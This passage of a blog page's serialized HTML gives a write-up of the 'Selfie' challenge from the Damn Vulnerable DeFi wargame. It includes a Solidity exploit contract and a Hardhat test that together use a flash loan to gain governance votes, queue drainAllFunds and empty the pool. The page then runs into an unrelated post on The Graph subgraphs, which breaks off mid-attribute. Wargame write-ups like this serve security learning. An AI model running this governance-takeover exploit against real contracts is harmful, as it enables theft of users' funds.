2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Solve</h2>\n<p>In order to steal the tokenPool’s assets, the attacker uses a combination of the previous vulnerabilities to attack. First, the attacker calls the flashLoan function of the flashLoan contract to loan the entire balance to the token pool. Implement a function to handle when the <code class=\"language-text\">receiveTokens</code> function call is executed in the process of acquiring sufficient balance. Because you have a sufficient balance, you meet the conditions to be eligible for governance voting rights. (It should be greater than half of the total balance.) During the flashLoan process, you must ensure that you do not panic and obtain the right to vote for governance.</p>\n<p>To call the <code class=\"language-text\">executeAction</code> function in the governance process, adjust the transaction to pass 2 days and call the <code class=\"language-text\">drainAllFunds</code> function. If this happens, since it is a contract with actual governance voting rights, function calls are possible and the balance can be stolen.</p>\n<h2 id=\"exploit-contract\" style=\"position:relative;\"><a href=\"#exploit-contract\" aria-label=\"exploit contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit Contract</h2>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"../DamnValuableTokenSnapshot.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./SimpleGovernance.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./SelfiePool.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SelfieExploit</span> <span class=\"token punctuation\">{</span>\n\n    SimpleGovernance <span class=\"token keyword\">public</span> governance<span class=\"token punctuation\">;</span>\n    SelfiePool <span class=\"token keyword\">public</span> pool<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> actionId<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> gvContract<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> poolContract<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        governance <span class=\"token operator\">=</span> <span class=\"token function\">SimpleGovernance</span><span class=\"token punctuation\">(</span>gvContract<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        pool <span class=\"token operator\">=</span> <span class=\"token function\">SelfiePool</span><span class=\"token punctuation\">(</span>poolContract<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token punctuation\">}</span>\n\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">receiveTokens</span><span class=\"token punctuation\">(</span>DamnValuableTokenSnapshot token<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        token<span class=\"token punctuation\">.</span><span class=\"token function\">snapshot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        token<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        actionId <span class=\"token operator\">=</span> governance<span class=\"token punctuation\">.</span><span class=\"token function\">queueAction</span><span class=\"token punctuation\">(</span>\n                    <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>pool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> \n                    abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span>\n                        <span class=\"token string\">\"drainAllFunds(address)\"</span><span class=\"token punctuation\">,</span>\n                        tx<span class=\"token punctuation\">.</span>origin\n                    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token number\">0</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> actionId<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_exploit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        pool<span class=\"token punctuation\">.</span><span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h2 id=\"exploit-contract-call\" style=\"position:relative;\"><a href=\"#exploit-contract-call\" aria-label=\"exploit contract call permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit Contract Call</h2>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> ethers <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hardhat'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> expect <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'chai'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">describe</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[Challenge] Selfie'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> deployer<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">const</span> <span class=\"token constant\">TOKEN_INITIAL_SUPPLY</span> <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'2000000'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 2 million tokens</span>\n    <span class=\"token keyword\">const</span> <span class=\"token constant\">TOKENS_IN_POOL</span> <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1500000'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 1.5 million tokens</span>\n    \n    <span class=\"token function\">before</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */</span>\n        <span class=\"token punctuation\">[</span>deployer<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getSigners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">const</span> DamnValuableTokenSnapshotFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'DamnValuableTokenSnapshot'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> SimpleGovernanceFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'SimpleGovernance'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> SelfiePoolFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'SelfiePool'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> DamnValuableTokenSnapshotFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token constant\">TOKEN_INITIAL_SUPPLY</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>governance <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> SimpleGovernanceFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> SelfiePoolFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>governance<span class=\"token punctuation\">.</span>address    \n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> <span class=\"token constant\">TOKENS_IN_POOL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">equal</span><span class=\"token punctuation\">(</span><span class=\"token constant\">TOKENS_IN_POOL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">it</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Exploit'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">/** CODE YOUR EXPLOIT HERE */</span>\n        <span class=\"token keyword\">const</span> SelfieExploitFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'SelfieExploit'</span><span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>selfieExploit <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> SelfieExploitFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>governance<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token builtin\">console</span><span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>selfieExploit<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>selfieExploit<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">_exploit</span><span class=\"token punctuation\">(</span><span class=\"token constant\">TOKENS_IN_POOL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"evm_increaseTime\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 5 days</span>\n        <span class=\"token comment\">// console.log( await this.selfieExploit.actionId());</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>governance<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">executeAction</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>selfieExploit<span class=\"token punctuation\">.</span><span class=\"token function\">actionId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span> value<span class=\"token operator\">:</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">after</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">/** SUCCESS CONDITIONS */</span>\n\n        <span class=\"token comment\">// Attacker has taken all tokens from the pool</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">equal</span><span class=\"token punctuation\">(</span><span class=\"token constant\">TOKENS_IN_POOL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        \n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">equal</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"next-time-\" style=\"position:relative;\"><a href=\"#next-time-\" aria-label=\"next time  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>next time.. 🚀</h2>\n<p>I will continue to post auditing and research on 12 challenge defi Smart Contracts.</p>\n<p>Thank you for the @tinchoabbate that made a good wargame.\n<a href=\"https://www.damnvulnerabledefi.xyz/\">Damn Vunlerable Defi</a></p>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#code-audit\">Code Audit</a></p>\n<ul>\n<li><a href=\"#dependency\">Dependency</a></li>\n<li><a href=\"#state-variables\">State Variables</a></li>\n<li><a href=\"#fucntions\">Fucntions</a></li>\n<li><a href=\"#dependency-1\">Dependency</a></li>\n<li><a href=\"#state-vairables\">State Vairables</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#functions\">Functions</a></p>\n</li>\n<li>\n<p><a href=\"#vulnerability\">Vulnerability</a></p>\n</li>\n<li>\n<p><a href=\"#solve\">Solve</a></p>\n</li>\n<li>\n<p><a href=\"#exploit-contract\">Exploit Contract</a></p>\n</li>\n<li>\n<p><a href=\"#exploit-contract-call\">Exploit Contract Call</a></p>\n</li>\n<li>\n<p><a href=\"#next-time-\">next time.. 🚀</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"August 02, 2022","title":"Damn Vulnerable DeFi Wargame Challenge6 — Selfie Contract Analysis ⚔️","categories":"Blockchain","author":"Zer0Luck","emoji":"🦊"},"fields":{"slug":"/defi-wargame-6/"}},"prev":{"id":"b972778c-f576-5161-9969-51f6604116ed","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACD0lEQVQoz6WSTU8TURiFX2baoZCgtTNTWootaYrId2oFCqnVVKGgo01EEkkqghChJGKI3xqjRhcqhoValK0fG1nrwvg7/AHGhSv/wmNmmNbCxoWLk3vuve97ct4PqfM0I2oQ+9Q8YRTnbiBaCFFjBDvPUXq5wZnJ44g0ImKieN0ctdnJq4VUiRp0BFt8cSISI5vMYU0XMbovMHFji+WNT5Q3V+lqj1VFd4s5OhV3FVEbwfoY4/4U86kp9gQiSH2SI9YVvq2VWBkeQET/t6DiwuMNOQ6GW6Pkox00RdKINJFojXD5RB9f7k1hBLZd2rF2ruoJua0Kbpe8TXREcSF7McJRJqwhRIQ64xCJ3EVEAjQl+tD8UUT2IXUBRDUR8TvcdWjSoEXINY+QMYcYDWU4Ghjk9MFTvHu7xa3SXW4O3WdxYZNrhRJj+ghZI82AnsJqOYbZGOdOx3kG9cOuGcVAb2ij3L/Ei955nvXM8TP/ig/JFcqjj/m48J4fuXVmowW+Zh/w29rkafcs670LfM+tMR7O8mu8zJOuGdepU7LJw84ir/sXGQtleNRZZLV9kpn9eU4aGT6nb5MxB1mOF3jTv8R0NM/VxFme98xxqc3i+oEp/L5YbQ9Np7GaN+xO2kQ8QVRvyGm8T4s4b5XY6gAUHc3bgl2ljR1TrqzM7hXa8a7+/atshs2VGi61Af+DirE/j440DqQledwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Uniswap\"\n        title=\"Uniswap\"\n        src=\"/static/8ca6b7eb5abaef56c52f9e1fa3eccc97/37523/uniswap-1.png\"\n        srcset=\"/static/8ca6b7eb5abaef56c52f9e1fa3eccc97/e9ff0/uniswap-1.png 180w,\n/static/8ca6b7eb5abaef56c52f9e1fa3eccc97/f21e7/uniswap-1.png 360w,\n/static/8ca6b7eb5abaef56c52f9e1fa3eccc97/37523/uniswap-1.png 720w,\n/static/8ca6b7eb5abaef56c52f9e1fa3eccc97/302a4/uniswap-1.png 1080w,\n/static/8ca6b7eb5abaef56c52f9e1fa3eccc97/07a9c/uniswap-1.png 1440w,\n/static/8ca6b7eb5abaef56c52f9e1fa3eccc97/29114/uniswap-1.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"subgraph\" style=\"position:relative;\"><a href=\"#subgraph\" aria-label=\"subgraph permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SubGraph</h2>\n<ul>\n<li>Decentralized protocol for indexing and querying data on the blockchain, starting with Ethereum</li>\n<li>Possible to inquire data that is difficult to inquire directly</li>\n<li>Uniswap complex smart contracts</li>\n<li>When it is difficult to read anything other than the underlying data directly from the blockchain, such as projects such as the Bored Ape Yacht Club NFT initiative</li>\n</ul>\n<h2 id=\"bored-ape-yacht-club\" style=\"position:relative;\"><a href=\"#bored-ape-yacht-club\" aria-label=\"bored ape yacht club permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Bored Ape Yacht Club</h2>\n<ul>\n<li>Get the owner of a specific Ape</li>\n<li>Perform basic read operations on contracts such as getting Ape content URI or total supply based on ID\n<ul>\n<li>Because read operations are programmed</li>\n</ul>\n</li>\n<li>Can be directly inserted into smart contracts, but not advanced expression queries and operations such as tweezers, searches, relationships and non-critical filtering\n<ul>\n<li>If you want to query data owned by a specific address and filter it by one of its characteristics, you cannot interact directly with the contract itself to get that information.</li>\n<li>To get this data, you need to process every single event with <code class=\"language-text\">transfer</code> event, read the metadata from IPFS using tokenid and IPFS hash and aggregate it.</li>\n<li>Distributed applications running in browsers take a long time to get answers to even relatively simple questions of this type</li>\n</ul>\n</li>\n<li>Blockchain properties such as chain reorganization and non-regular blocks make this process more complex and time consuming</li>\n<li>Solve problems using a distributed protocol that indexes and enables performance and efficient queries of blockchain data\n<ul>\n<li>You can query these APIs (indexed “subGraphs”) with standard GraphQL APIs.</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"how-graphs-work\" style=\"position:relative;\"><a href=\"#how-graphs-work\" aria-label=\"how graphs work permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How Graphs Work</h3>\n<ul>\n<li>Graph\n<ul>\n<li>subGraph == manifest</li>\n<li>Learn items and methods of indexing Ethereum data based on subGraph describe.</li>\n<li>Define the smart contract for the SubGraph, the events in that contract that need attention, and how the graph maps the event data to the data to be stored in the database.</li>\n<li>Use the <code class=\"language-text\">subgraph manifest</code> graph CLI to instruct the indexer that defines and stores in IPFS to start indexing data for that subgraph</li>\n</ul>\n</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 82.22222222222221%; position: relative; bottom: 0; left: 0; background-image: 